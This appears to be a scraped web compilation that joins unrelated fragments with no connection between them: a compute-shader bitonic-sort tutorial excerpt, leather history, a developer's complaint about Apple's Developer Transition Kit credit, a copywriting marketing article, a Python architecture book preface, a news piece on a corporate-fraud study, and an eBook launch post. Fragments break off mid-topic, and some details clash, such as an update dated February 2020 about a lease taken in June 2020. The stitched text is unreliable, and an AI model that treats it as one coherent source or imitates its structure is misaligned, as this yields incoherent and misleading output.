</div><p>We need to find the group counts in <code>x</code>, <code>y</code>, and <code>z</code> dimension for our dispatch command. Since we want each compute command to execute <span>one step of our bitonic sorting grid</span><span> (that's one vertical slice)</span>, let's stick to a one-dimensional invocation: I'm setting <code>groupCountY = 1</code> and <code>groupCountZ = 1</code>, since these values must be at minimum 1.</p>
<h2 id="what-do-we-set-for-groupcountx">What do we set for <code>groupCountX</code>?&nbsp;<a href="#what-do-we-set-for-groupcountx"></a></h2>
<p>Well, this will depend on the size of our workgroup, and the total number of sortable elements. Let's say we have <span>\(  n=16 \)</span> sortable elements. This means, we will need <span>\(  \frac{n}{2} = 8 \)</span> worker threads. Let's say each workgroup contains 8 worker threads, this means we would need to call our dispatch with a <code>groupCountX</code> of 1.</p>
</div>
<div>
	
<p>Every invocation triggers one workgroup of thread workers. In shade code, we can specify how many threads we want to have per work-group, by specifying <code>local_size_x</code>, and in this particular case, we would choose 8.</p>

This depicted that early humans must have been using animal skins to wrap themselves in the still warm hides. They used to stiff hides at low temperatures and rot them in the heat to make it durable, and flexible. Then they discovered that by drying the animal skin in sun and using salt to dehydrate, the natural rotting process of animal skin stopped. Once the skin is dried, they transformed it into clothing, shelters, and footwear.</p><p>Learn more about the origins of leather <span><a href="http://www.all-about-leather.co.uk/what-is-leather/where-does-leather-come-from.htm"><b>here</b></a></span>.</p></div></div></div></div></div></div></div></div></section><section data-id="230a4e2" data-element_type="section"><div><div><div data-id="c1e8de3" data-element_type="column"><div><div><div data-id="9d58faf" data-element_type="widget" data-widget_type="heading.default"><p><h3>The Rich History of Leather</h3></p></div></div></div></div></div></div></section><section data-id="976a119" data-element_type="section"><div><div><div data-id="f4dab9f" data-element_type="column"><div><div><div data-id="9c0661f" data-element_type="widget" data-widget_type="image.default"><div><p><img width="892" height="787" src="https://miajees.com/wp-content/uploads/2020/10/rich-history.jpg" alt="Leather History" loading="lazy" srcset="https://miajees.com/wp-content/uploads/2020/10/rich-history.jpg 892w, https://miajees.com/wp-content/uploads/2020/10/rich-history-300x265.jpg 300w, https://miajees.com/wp-content/uploads/2020/10/rich-history-768x678.jpg 768w, https://miajees.com/wp-content/uploads/2020/10/rich-history-600x529.jpg 600w" sizes="(max-width: 892px) 100vw, 892px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22892%22%20height%3D%22787%22%20viewBox%3D%220%200%20892%20787%22%3E%3Cfilter%20id%3D%22b%22%3E%3CfeGaussianBlur%20stdDeviation%3D%2212%22%20%2F%3E%3C%2Ffilter%3E%3Cpath%20fill%3D%22%23a4a4a4%22%20d%3D%22M0%200h892v783H0z%22%2F%3E%3Cg%20filter%3D%22url(%23b)%22%20transform%3D%22translate(1.7%201.7)%20scale(3.48438)%22%20fill-opacity%3D%22.5%22%3E%3Cellipse%20fill%3D%22%23fff%22%20rx%3D%221%22%20ry%3D%221%22%20transform%3D%22rotate(-91.2%20170.4%2041.6)%20scale(20.11624%20212.13655)%22%2F%3E%3Cellipse%20fill%3D%22%23797979%22%20rx%3D%221%22%20ry%3D%221%22%20transform%3D%22matrix(78.64675%202.45608%20-2.79717%2089.569%20110.5%2097)%22%2F%3E%3Cellipse%20fill%3D%22%23dadada%22%20rx%3D%221%22%20ry%3D%221%22%20transform%3D%22rotate(-102.6%20149.9%20-74.2)%20scale(64.09721%2043.26718)%22%2F%3E%3Cellipse%20fill%3D%22%23dbdbdb%22%20cy%3D%22179%22%20rx%3D%2218%22%20ry%3D%22225%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E" data-src="https://miajees.com/wp-content/uploads/2020/10/rich-history.jpg" data-srcset="https://miajees.com/wp-content/uploads/2020/10/rich-history.jpg 892w, https://miajees.com/wp-content/uploads/2020/10/rich-history-300x265.jpg 300w, https://miajees.com/wp-content/uploads/2020/10/rich-history-768x678.jpg 768w, https://miajees.com/wp-content/uploads/2020/10/rich-history-600x529.jpg 600w"></p></div></div></div></div></div></div></div></section><section data-id="f130238" data-element_type="section"><div><div><div data-id="39134aa" data-element_type="column"><div><div><div data-id="1d912fa" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>The discovery of leather is known to be one of the earliest founds of man in history.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So I gambled…</p><p>I hoped Apple would do the right thing by developers who paid for access to the Developer Transition Kit (DTK) to get the first Apple Silicon Macs, but I was wrong and I lost.</p><blockquote><p><strong>UPDATE - 6 Feb 2020:</strong> Apple has responded to feedback from me and other disgruntled developers and so I didn’t lose as much as I thought. Apple is now giving US $500 credit, which is what developers in the US paid for the DTK, and they are extending the time limit to the end of the year. I am quite certain they will release a desktop M1 Mac before then, so I will get credit for most of the cost of the DTK (after exchange rate losses) and I will be able to use the credit towards a Mac that I want.</p><p>Thanks Apple for listening and reacting.</p></blockquote><hr><p>I paid Apple AU $779 for a year’s lease on a DTK which was effectively a Mac mini with an iPad CPU.
I also had to buy a monitor to use with it.</p><p>That was in June 2020.</p><p>In November 2020, the M1 was released which made the A14Z based DTK totally irrelevant for testing or development, so the lease effectively only lasted for 5 months. At that I was luckier than many devs as a lot of these DTK machines started failing at around the 4 month mark.</p><ul><li>I kept Apple’s secrets.</li><li>I tested their hardware and software.</li><li>I filed bug reports, a couple of which even got acknowledged.</li></ul><p>And in return, I get asked to send back the DTK some months early for which I will get the princely reward of US $200 credit.</p><p>When Apple switched over to Intel CPUs, they gave the DTK buyers a free computer when they returned the DTK, but of course Apple wasn’t a trillion dollar company back then so they could afford to be generous. (How does one indicate heavy sarcasm in text?)</p><p>I don’t want a laptop, I want a desktop Mac, so there is nothing to spend my $200 credit on yet, but as a final sting in the tail, Apple has decreed that the credit expires at the end of May 2021. There is no guarantee that there will be desktop Mac to buy before then. Only Apple knows that and they have made me cynical enough to consider that they might decide not to release any new Macs until after these credits expire.</p><p>I realize that Apple made no commitment to do anything after the DTK program was over, but history indicated they would.</p><p>The smallness of the credit and the short time limit on it seem unnecessarily petty and punitive, especially when the people they are punishing are the ones that add so much value to the Apple platforms.</p><p>Assuming I have to get a laptop, I will want a high-powered one as it will have to be able to run Xcode. Apple’s flagship developer tool is famously demanding.</p><ul><li><p>In the US, the one I want costs US $1,899</p></li><li><p>Here in Australia, it is AU $2,899 - 1.53 times the US price.</p></li></ul><p>The US$200 credit will use the exchange rate at 23 December 2020, which for USD - AUD was 1.3218 which is significantly lower than the ratio in Apple’s pricing between the two countries.</p><p>This means that I will get AU $264.36 for my credit, which is 9% of the cost of the computer to replace it, even though that is not the computer I actually want.</p><p>Financially, I would have been much better off waiting until the M1s were released. But Apple needed the early machines tested, so they suckered us in and then slapped us in the face.</p><p>I wonder how Tim Cook and the others can stand up again and again and say that they value their developers. Does that not make them feel ashamed? Or maybe they struggle not to laugh while saying it?</p><p>Thanks Apple.</p><p>And good luck finding suckers to test your next round of new hardware.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="1c70e0d9" data-element_type="widget" data-widget_type="theme-post-content.default">

<p>For many startups working on product launches, marketing is bottom of the to-do list. The company is understandably focused on building a great product. For small teams, there may not be any resources left over for other activities.</p>



<p>Once the product is nearly ready, the company starts building its product page, and perhaps some supporting blog posts or PPC ads. However, when an inexperienced marketing team cooks up these marketing assets, they lack a crucial ingredient.</p>



<p>And all too often, that means a disappointing product launch with low sales.</p>



<p><strong>So, what is that missing magic ingredient? Copywriting. </strong></p>



<p>When marketing materials need to generate results, good copywriting is what will grab the <a href="https://launchmappers.com/market-positioning-done-right/">ideal customer</a>’s attention and make them think “<strong>this is the product I’ve been waiting for!</strong>”</p>







<h3><strong>What is copywriting?</strong></h3>







<p><a href="https://launchmappers.com/go-to-market-specialists/#team">Jon Evans</a>, our lead copywriter at Launch Mappers, has worked extensively with agencies and global brands, and now focuses on tech startups.</p>



<p>He defines copywriting as “<strong>any writing that’s intended to build relationships, grab attention, and persuade people to take action in some way</strong>”. It’s an essential part of marketing, used in everything from social media to <a href="https://launchmappers.com/email-marketing-in-inbound-strategies/">emails</a>, landing pages, business cards and sales pages.</p>



<p>In the past, <strong>copywriters often described their trade as ‘sales in print’</strong>, meaning it did a salesperson’s job of persuading the prospect to buy, except through writing. Nowadays, it plays a much broader role in the sales process, since most digital sales funnels begin with an inbound marketing strategy (i.e. content).</p>



<p>In the digital age, copywriting is still an essential tool for persuading people to buy. But it also has to inform, entertain, and win the attention of its audience. And with every consumer now being bombarded with thousands of marketing messages daily, their attention is more valuable than ever.</p>







<h3><strong>The key to winning and keeping attention online</strong></h3>







<p>Copywriting is useful from the start of a customer’s journey: the moment they Google something. “The customer has thousands of websites to choose from,” says Evans. “You need to entice them to visit yours with copy that arouses their curiosity, stirs their emotions, or offers a benefit that you know they care about.”</p>



<p>“But of course, we don’t want them just to read an article and leave. We want them to keep exploring and eventually enter into a relationship with us—whether that means buying our product or giving us their email address”.</p>



<p>“To do that, we need to offer our prospect something of value, and we need to keep their attention long enough to show it to them. Great content and great copywriting are what makes that happen”.</p>







<h3><strong>When should startups invest in copywriting?</strong></h3>







<p><strong>Many startups neglect copywriting—or don’t know about it—making it an often-overlooked aspect of product launches.</strong> Other startups invest heavily in their websites through design agencies that neglect copy themselves.</p>



<p>In both scenarios, <strong>the startup only realises its messaging is weak after the website or product has been launched</strong>.</p>



<p>As Evans says, “Many businesses only realise that they need to invest in copywriting when they reach a stumbling block. They find themselves wondering ‘<strong>why is nobody buying from the product sales page?</strong>’ or ‘<strong>why is no one opening our emails?</strong>’”</p>



<p>“Suddenly, they realise they have a particular marketing problem to solve” Evans continues. “And while it happens at different stages for different companies, it’s almost guaranteed that every growing startup will invest in better copy at some point.”</p>



<p>We at Launch Mappers, recommend investing in copywriting early in your launch planning, essentially as copywriting often involves a detailed research phase.</p>







<h3><strong>What can copywriting help startups with?</strong></h3>







<p>Copywriting plays a crucial role in the launch of your product since <strong>it expresses why your solution is the right solution for your customers</strong>. And in developing the story of your brand, it can help you stand out in your marketplace.</p>







<h4>1) Build your brand</h4>







<p>“Branding is about the overall story you are telling the people who you want to become your customers. It is about creating a personal relationship with customers and influencing how people think and feel about your company,” says Evans.</p>



<p>Indeed, there are <strong>two tangible aspects of branding: visuals and verbal communication</strong>. A good copywriter will help your brand shine through in all of your communication. For example: on your website, in your emails, and even in video scripts or webinars.</p>

<p><strong>“I’d go as far as to say you can’t have a brand without having at least some copywriting involved.” </strong></p>



<p>Even a primarily visual brand, like a fashion brand, will usually be defined by a written mission statement”.</p>



<p>Branding is a long-term strategy. When you’re starting to decide how to market your company and your product, <strong>your brand is the first piece of the puzzle</strong>.</p>







<h4>2) Launch products successfully</h4>







<p>There are arguably<strong> two different types of product launches</strong> for marketers: those for entirely new products with no competitors, and those for established products that already have competitors in the marketplace.&nbsp;</p>



<p>They both present distinct challenges. For products in a crowded marketplace, the marketer has to convince its audience that the product is the best solution. Conversely, when the product has no competitors, the marketer may have to convince prospects that they need the solution.&nbsp;</p>



<p>In either scenario, copywriting will help you tell your brand story and give people a reason to choose your product. Evans shared some initial questions to consider when launching a new product:</p>



<ul><li><strong>How is this product different from others?</strong></li><li><strong>Why would our audience buy from us instead of someone else?</strong></li><li><strong>If a prospect doesn’t need our product right now, what would help them remember it at a later date?</strong></li></ul>







<h4>3) Increase conversion rates&nbsp;</h4>







<p>The copy is integral to developing results for businesses that rely on digital platforms to make sales or generate leads. In this situation, it’s helpful to revisit the ‘salesperson in print’ idea of copy.</p>



<p>Imagine you own a physical shop, and you have a salesperson that speaks to customers. However, this salesperson is dull, hard to understand, and only talks about themselves and never the customer.</p>



<p>Now imagine the shop next door has a salesperson. However, this one is charismatic, easy to talk to, and able to help customers see how specific products meet their needs.</p>



<p>You’d probably expect the shop next door to make a lot more sales, only because it makes things easier for the customer!</p>



<p><strong>Good copy is precisely like a skilled salesperson—clear, helpful, and even charming</strong>. It can show the customer why a product is right for them without being pushy or annoying. And it can even handle your customers’ doubts, so they feel good about taking action.</p>



<p>Of course, the goal of digital platforms is not always sales. It might be to encourage webinar sign-ups, social media follows or clicks. But the result—a.k.a the conversion—is often directly influenced by copy.</p>







<h3><strong>Real-world examples:</strong></h3>







<p>Founder of <a href="https://wynter.com/" target="_blank" rel="noopener">Wynter</a>, Peep Laja shares the example of improving this <a href="https://www.daveramsey.com/store/product/know-yourself-know-your-money-book" target="_blank" rel="noopener">product page</a> for Ramsey Solutions.</p>



<blockquote><p>“Ramsey Solutions saw a 15% increase in the sales conversion rate from the insights gained from their first messaging test with Wynter. The change included changing the sub-heading and the body copy by addressing identified friction and unanswered questions people had.”</p></blockquote>







<p>The landing page platform <a href="https://unbounce.com/" target="_blank" rel="noopener">Unbounce</a> shared an experiment Norway-based digital agency <a href="https://conversionlab.no/" target="_blank" rel="noopener">ConversionLab</a> did on their client’s landing page, <a href="https://www.campaignmonitor.com/" target="_blank" rel="noopener">Campaign Monitor</a>. They wanted to discover if the verb used when researching the email marketing software in a Google search would affect how the product would be perceived.</p>



<p>ConversionLab’s founder Finge <a href="https://unbounce.com/landing-page-examples/built-using-unbounce/dynamic-text-a-b-test/" target="_blank" rel="noopener">told</a> Unbounce how “our hypothesis was that a verb defines HOW you solve a challenge; i.e. do you design an email campaign or do you create it? And if we could meet the visitor’s definition of solving their problem we would have a greater chance of converting a visit to a signup. The uplift was higher than we had anticipated!”</p>







<h3><strong>How do conversion copywriting and brand copywriting differ?</strong></h3>







<p><strong>Branding is a long game where you will develop your identity</strong>, making sure that people will remember it in the long run. But generating sales or conversions involves influencing the reader to take action at a specific moment.</p>



<p>So what does this mean for our copy? Brand-focused copywriting is about speaking in a tone that reflects the brand’s identity. It’s also about taking opportunities to communicate the company’s mission and values.</p>

<p><strong>Conversion copywriting is solely focused on the prospect’s journey</strong>. It’s about giving them the sales argument at the right moment, so they decide to take action. This can apply across social media, blogs, email campaigns, sales pages, videos, and beyond.</p>



<p>These two are both ends of the spectrum; however, developing your brand’s story should not get in the way of your sales.</p>



<p>“You should aim at developing both as long, as they don’t interfere with each other,” says Evans. “You always want to keep your conversion in goals in mind. But the brand should ideally be worked into every touchpoint, even if it’s only subtle—and a lot of branding is subtle.”</p>



<p><strong>So, by improving your copy strategically, you can improve both your sales and your brand loyalty.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>You may be wondering who we are and why we wrote this book.</p>
<p>At the end of Harry’s last book,
<a href="http://www.obeythetestinggoat.com/"><em>Test-Driven Development with Python</em></a> (O’Reilly),
he found himself asking a bunch of questions about architecture, such as,
What’s the best way of structuring your application so that it’s easy to test?
More specifically, so that your core business logic is covered by unit tests,
and so that you minimize the number of integration and end-to-end tests you need?
He made vague references to "Hexagonal Architecture" and "Ports and Adapters"
and "Functional Core, Imperative Shell," but if he was honest, he’d have to
admit that these weren’t things he really understood or had done in practice.</p>
<p>And then he was lucky enough to run into Bob, who has the answers to all these
questions.</p>
<p>Bob ended up as a software architect because nobody else on his team was
doing it. He turned out to be pretty bad at it, but <em>he</em> was lucky enough to run
into Ian Cooper, who taught him new ways of writing and thinking about code.</p>
<div>
<h3 id="_managing_complexity_solving_business_problems"><a href="#_managing_complexity_solving_business_problems"></a>Managing Complexity, Solving Business Problems</h3>
<p>We both work for MADE.com, a European ecommerce company that sells furniture
online; there, we apply the techniques in this book to build distributed systems
that model real-world business problems. Our example domain is the first system
Bob built for MADE, and this book is an attempt to write down all the <em>stuff</em> we
have to teach new programmers when they join one of our teams.</p>
<p>MADE.com operates a global supply chain of freight partners and manufacturers.
To keep costs low, we try to optimize the delivery of stock to our
warehouses so that we don’t have unsold goods lying around the place.</p>
<p>Ideally, the sofa that you want to buy will arrive in port on the very day
that you decide to buy it, and we’ll ship it straight to your house without
ever storing it. <span>Getting</span> the timing right is a tricky balancing act when goods take
three months to arrive by container ship. Along the way, things get broken or water
damaged, storms cause unexpected delays, logistics partners mishandle goods,
paperwork goes missing, customers change their minds and amend their orders,
and so on.</p>
<p>We solve those problems by building intelligent software representing the
kinds of operations taking place in the real world so that we can automate as
much of the business as possible.</p>
</div>
<div>
<h3 id="_why_python"><a href="#_why_python"></a>Why Python?</h3>
<p>If you’re reading this book, we probably don’t need to convince you that Python
is great, so the real question is "Why does the <em>Python</em> community need a book
like this?" The answer is about Python’s popularity and maturity: although Python is
probably the world’s fastest-growing programming language and is nearing the top
of the absolute popularity tables, it’s only just starting to take on the kinds
of problems that the C# and Java world has been working on for years.
Startups become real businesses; web apps and scripted automations are becoming
(whisper it) <em>enterprise</em> <span><em>software</em></span>.</p>
<p>In the Python world, we often quote the Zen of Python:
"There should be one—​and preferably only one—​obvious way to do it."<sup>[<a id="_footnoteref_1" href="#_footnotedef_1" title="View footnote.">1</a>]</sup>
Unfortunately, as project size grows, the most obvious way of doing things
isn’t always the way that helps you manage complexity and evolving
requirements.</p>
<p>None of the techniques and patterns we discuss in this book are
new, but they are mostly new to the Python world. And this book isn’t
a replacement for the classics in the field such as Eric Evans’s
<em>Domain-Driven Design</em>
or Martin Fowler’s <em>Patterns of
Enterprise Application Architecture</em> (both published by Addison-Wesley <span>Professional</span>)—which we often refer to and
encourage you to go and read.</p>
<p>But all the classic code examples in the literature do tend to be written in
Java or <span>C++/#</span>, and if you’re a Python person and haven’t used either of
those languages in a long time (or indeed ever), those code listings can be
quite…​trying. There’s a reason the latest edition of that other classic text, Fowler’s
<em>Refactoring</em> (Addison-Wesley Professional), is in JavaScript.</p>
</div>
<div>
<h3 id="_tdd_ddd_and_event_driven_architecture"><a href="#_tdd_ddd_and_event_driven_architecture"></a>TDD, DDD, and Event-Driven Architecture</h3>
<p>In order of notoriety, we know of three tools for managing complexity:</p>
<div>
<ol>
<li>
<p><em>Test-driven development</em> (TDD) helps us to build code that is correct
and enables us to refactor or add new features, without fear of regression.
But it can be hard to get the best out of our tests: How do we make sure
that they run as fast as possible? That we get as much coverage and feedback
from fast, dependency-free unit tests and have the minimum number of slower,
flaky end-to-end tests?</p>
</li>
<li>
<p><em>Domain-driven design</em> (DDD) asks us to focus our efforts on building a good
model of the business domain, but how do we make sure that our models aren’t
encumbered with infrastructure concerns and don’t become hard to change?</p>
</li>
<li>
<p>Loosely coupled (micro)services integrated via messages (sometimes called
<em>reactive microservices</em>) are a well-established answer to managing complexity
across multiple applications or business domains. But it’s not always
obvious how to make them fit with the established tools of
the Python world—​Flask, Django, Celery, and so on.</p>
</li>
</ol>
</div>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
Don’t be put off if you’re not working with (or interested in) microservices.  The vast majority of the patterns we discuss, including much of the event-driven architecture material, is absolutely applicable in a monolithic architecture.
</td>
</tr>
</tbody></table>
</div>
<p>Our aim with this book is to introduce several classic architectural patterns
and show how they support TDD, DDD, and event-driven services.  We hope
it will serve as a reference for implementing them in a Pythonic way, and that
people can use it as a first step toward further research  in this field.</p>
</div>
<div>
<h3 id="_who_should_read_this_book"><a href="#_who_should_read_this_book"></a>Who Should Read This Book</h3>
<p>Here are a few things we assume about you, dear reader:</p>
<div>
<ul>
<li>
<p>You’ve been close to some reasonably complex Python applications.</p>
</li>
<li>
<p>You’ve seen some of the pain that comes with trying to manage
that complexity.</p>
</li>
<li>
<p>You don’t necessarily know anything about DDD or any of the
classic application architecture patterns.</p>
</li>
</ul>
</div>
<p>We structure our explorations of architectural patterns around an example app,
building it up chapter by chapter. We use TDD at
work, so we tend to show listings of tests first, followed by implementation.
If you’re not used to working test-first, it may feel a little strange at
the beginning, but we hope you’ll soon get used to seeing code "being used"
(i.e., from the outside) before you see how it’s built on the inside.</p>
<p>We use some specific Python frameworks and technologies, including Flask,
SQLAlchemy, and pytest, as well as Docker and Redis. If you’re already
familiar with them, that won’t hurt, but we don’t think it’s required.  One of
our main aims with this book is to build an architecture for which specific
technology choices become minor implementation details.</p>
</div>
<div>
<h3 id="_a_brief_overview_of_what_youll_learn"><a href="#_a_brief_overview_of_what_youll_learn"></a>A Brief Overview of What You’ll Learn</h3>
<p>The book is divided into two parts; here’s a look at the topics we’ll cover
and the chapters they live in.</p>
<div>
<h4 id="_part1"><a href="#_part1"></a><a data-type="xref" data-xrefstyle="chap-num-title" href="http://www.cosmicpython.com/book/part1.html">#part1</a></h4>

<dt>Domain modeling and DDD (Chapters <a href="http://www.cosmicpython.com/book/chapter_01_domain_model.html">1</a>, <a href="http://www.cosmicpython.com/book/chapter_02_repository.html">2</a> and <a href="http://www.cosmicpython.com/book/chapter_07_aggregate.html">7</a>)</dt>
<dd>
<p>At some level, everyone has learned the lesson that complex business
problems need to be reflected in code, in the form of a model of the domain.
But why does it always seem to be so hard to do without getting tangled
up with infrastructure concerns, our web frameworks, or whatever else?
In the first chapter we give a broad overview of <em>domain modeling</em> and DDD, and we
show how to get started with a model that has no external dependencies, and
fast unit tests. Later we return to DDD patterns to discuss how to choose
the right aggregate, and how this choice relates to questions of data
integrity.</p>
</dd>
<dt>Repository, Service Layer, and Unit of Work patterns (Chapters <a href="http://www.cosmicpython.com/book/chapter_02_repository.html">2</a>, <a href="http://www.cosmicpython.com/book/chapter_04_service_layer.html">4</a>, and <a href="http://www.cosmicpython.com/book/chapter_05_high_gear_low_gear.html">5</a>)</dt>
<dd>
<p>In these three chapters we present three closely related and
mutually reinforcing patterns that support our ambition to keep
the model free of extraneous dependencies.  We build a layer of
abstraction around persistent storage, and we build a service
layer to define the entrypoints to our system and capture the
primary use cases. We show how this layer makes it easy to build
thin entrypoints to our system, whether it’s a Flask API or a CLI.</p>

<dd>
<p>After presenting the first abstraction (the Repository pattern), we take the
opportunity for a general discussion of how to choose abstractions, and
what their role is in choosing how our software is coupled together. After
we introduce the Service Layer pattern, we talk a bit about achieving a <em>test pyramid</em>
and writing unit tests at the highest possible level of abstraction.</p>

<dt>Event-driven architecture (Chapters <a href="http://www.cosmicpython.com/book/chapter_08_events_and_message_bus.html">8</a>-<a href="http://www.cosmicpython.com/book/chapter_11_external_events.html">11</a>)</dt>
<dd>
<p>We introduce three more mutually reinforcing patterns: the Domain Events, Message Bus, and Handler patterns. <em>Domain events</em> are a vehicle for capturing the idea that some
interactions with a system are triggers for others. We use  a <em>message
bus</em> to allow actions to trigger events and call appropriate <em>handlers</em>.
We move on to discuss how events can be used as a pattern for integration
between services in a microservices architecture. Finally, we distinguish between <em>commands</em> and <em>events</em>. Our application is now
fundamentally a message-processing system.</p>

							<p><span>Big name corporations with robust growth profiles are more likely to be caught up in corporate fraud than smaller, struggling firms.</span></p>
<p><span>Corporate fraud is an illegal, unethical, and highly strategized maneuver committed by a company or an individual associated with the company in order to defraud investors, and the government of millions and even billions in tax revenue. The fraud schemes involve approaches to misrepresent the company’s financial standing by use of false accounting practices.</span></p>
<p><span>In a corporate world, this type of elite, while-collar crime is not very uncommon. In fact, it’s been going on since the 15th century England.&nbsp;</span></p>

<p><span>In the study published in <em><a href="https://www.tandfonline.com/doi/abs/10.1080/07418825.2020.1853799?journalCode=rjqy20" target="_blank" rel="noopener">Justice Quarterly</a></em>, the researchers zeroed in on data on more than 250 U.S. public corporations that had involvement in financial securities fraud identified in more than 1000 Securities and Exchange Commission filings from 2005 to 2013. </span></p>
<p><span>Upon comparing their characteristics to a control sample of over 500 firms (from Compustat) that were not listed in SEC fiscal evasion filings, they found growing fads in the risk of fraud including corporations that were listed in the Fortune 500, traded on the NYSE and had strong growth prospects.</span></p>
<p><span>“Prestigious companies, those that are household names, were actually more prone to engage in financial fraud, which was very surprising,” said Jennifer Schwartz, WSU sociologist and lead author on the study in <a href="https://news.wsu.edu/2021/02/02/big-name-corporations-likely-commit-fraud/" target="_blank" rel="noopener">a news release</a>.</span></p>
<p><span>“We thought it would be companies that were struggling financially, that were nearing bankruptcy, but it was quite the opposite. It was the companies that thought they should be doing better than they were, the ones with strong growth imperatives–those were the firms that were most likely to cheat.”</span></p>
<p><span>Corporate financial securities frauds are usually surreptitious and nonviolent in nature. They are also understudied especially when compared with street crimes, even though they can inflict far worse devastating effects on the economy.</span></p>
<p>D<span>etection and prosecution of this type of elite crime can also be highly challenging because the individuals involved in it usually go to great lengths in order to conceal their activities.</span></p>
<p><span>“What these companies were doing was essentially fudging the numbers, lying to investors, other companies and the SEC,” said Schwartz. “Eventually, you have to make up for the money that was lost, that really never existed, so shareholders lose money, people lose retirement plans, people lose jobs. It’s very, very damaging.”</span></p>
<p><span>For the study, the team looked at the time period where a massive financial collapse that shook Wall Street to its core, took place. They also incorporated data on the fraud <a href="https://www.thebalance.com/worldcom-s-magic-trick-356121" target="_blank" rel="noopener">scandals of WorldCom</a> and <a href="https://corporatefinanceinstitute.com/resources/knowledge/other/enron-scandal/" target="_blank" rel="noopener">Enron</a>, and the subsequent regulatory Sarbanes-Oxley Act of 2002.</span></p>
<p><span>The intent of the study was to figure out the operations at publicly traded companies in which there was high probability for perpetrating fraud.</span></p>
<p><span>They found that big corporations with Fortune 500 status were represented nearly four times as often among the firms that had committed fraud than the control group with no history of financial fraud. Similarly, firms that traded on NYSE were represented 2 times more among fraudulent firms compared to non-fraud, which is higher than those that trade on other exchanges like the NASDAQ or OTC.</span></p>
<p>The study also found that fraud is more prevalent when the CEO was also the chair of the board, but the potential link between the extent of fraud and position in the company is yet to be established.</p>
<p><span>“We need to look more at corporate leadership arrangements, and the responsibility of individuals in creating the culture of the company itself,” explained </span><span>Schwartz</span><span>. “How can leaders encourage companies to be more successful not only in terms of profit or growth but also in terms of corporate social responsibility?”</span></p>

   <article>

        

        <section>
            <div><p>I wanted to write to you all and share that I've launched my first eBook called <a href="https://gumroad.com/l/serverless-for-everyone-else">"Serverless For Everyone Else"</a> - within the first three hours of launch, nobody bought a single copy and I thought that I'd got it all wrong.</p>
<p>The "everyone else" is a reference to how complicated and difficult cloud-based and Kubernetes-based FaaS has become. The eBook sets out to help indie developers, and individuals within corporations build and deploy functions using a new version of OpenFaaS (<a href="https://github.com/openfaas/faasd">faasd</a>) which is open source and can run on a single VM or VPS without much overhead.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>The real power of functions comes in extending existing systems through webhooks, polling, or querying and updating state. I'll share some of these use-cases below including how I used functions to extend how the Gumroad marketplace worked.</p>
<p>Why did I decide to write an eBook? If you've ever written about tech or spoken at a conference, then Packt has probably approached you on LinkedIn about writing for them. From what I hear, that kind of arrangement means writing in a word doc, with tight deadlines and cranking out 300+ pages. It wasn't for me.</p>
<p>I'd seen <a href="https://twitter.com/dvassallo">Daniel Vassallo</a> create an eBook about AWS and Twitter. Daniel had really good results using Gumroad to sell his self-published eBooks. Then there's <a href="https://twitter.com/adamwathan">Adam Wathan</a> who built Tailwind CSS and trained himself up as a UI designer. He wrote his own eBook and in his yearly review mentioned that it did 600k USD in passive sales, without any promotion.</p>
<p>Whilst I didn't expect to get anywhere close to those numbers with a specialist topic, I did want to know if people would buy something from me.</p>
<h2 id="thetiersatlaunch">The tiers at launch</h2>
<p>I launched with three tiers, with names and clear differentiation:</p>
<ul>
<li>Minimalist - 25 USD - just the eBook</li>
<li>DevOps PRO - 50 USD - the eBook, plus a Grafana dashboard and the YAML for faasd to enable it</li>
<li>The learner - 99 USD - the eBook, plus a Grafana dashboard,  the YAML for faasd to enable it and a video workshop ready in 7 days</li>
<li>The team player - the learner, but for 5 people in your company</li>
</ul>
<p>As long as your options add some value, it seems that people enjoy the choice and are willing to pay a little more.</p>
<p>So I tweeted about the eBook and then nothing happened for three hours.</p>
<p>I interpreted this as a failure. I'd been reading <a href="https://amzn.to/38N5uZy">"The Right It: Why So Many Ideas Fail and How to Make Sure Yours Succeed"</a>, and had convinced myself that this was a sign that nobody wanted the material.</p>
<p>Then I got my first sale, and felt a little relief, maybe I was wrong?</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810538-27b57080-57ed-11eb-905b-d042d3046adf.png" alt="Sale email"></p>
<p>My sales graph had one initial spike on the Friday, and kept going into the Sunday. What had happened? My Twitter audience and GitHub Sponsors came to lend their support.</p>
<p><img src="https://pbs.twimg.com/media/ErzMnuOXMAA_REk?format=jpg&amp;name=medium" alt="Initial spike"></p>
<p>Then things died down, and over the course of the week I wondered if I'd failed to find market fit. <a href="https://gumroad.com/">Gumroad</a> was sending me almost no organic traffic, and nobody was landing on the page via SEO.</p>
<p>It was still more money than I had expected to earn from the eBook within the first week, but I felt like with so much interest in OpenFaaS, that there was a broader audience to reach.</p>
<h2 id="gettingasecondpeak">Getting a second peak</h2>
<p>After the first week, I released the video workshop to the people who'd purchased that tier (99USD), and to get some feedback, I offered a free upgrade to the workshop for the tier just below (50USD). That resulted in another large spike in interest.</p>
<p><img src="https://camo.githubusercontent.com/4e204e93dcfc33679c997c739fbf4f651fdf268d23961bae6f9b4c25ad4ec145/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f45735a3372753258634155513451673f666f726d61743d6a7067266e616d653d6d656469756d" alt="Video workshop"></p>
<p>How did I fulfil the upgrade / discount? I did it by writing a function and deploying it to my Raspberry Pi, so that Gumroad would send a webhook, my code would query the dollar amount, and then send out an email to the customer over AWS SES.</p>
<p><img src="https://pbs.twimg.com/media/EscxNxbXAAEHD8z?format=jpg&amp;name=large" alt="The function running"></p>
<p>Get the source code here: <a href="https://github.com/alexellis/gumroad-responder">alexellis/gumroad-responder</a></p>
<p>After the second peak, I saw a complete drop-off again - and started to wonder why?</p>
<p>99% of referrals came from Twitter and email, so had I exhausted my network?</p>
<p>I went ahead and added a link on openfaas.com and on my blog at the end of each post, to try and get more views on the eBook. It's too early to tell if that is going to work out, but has resulted in a few conversions already.</p>
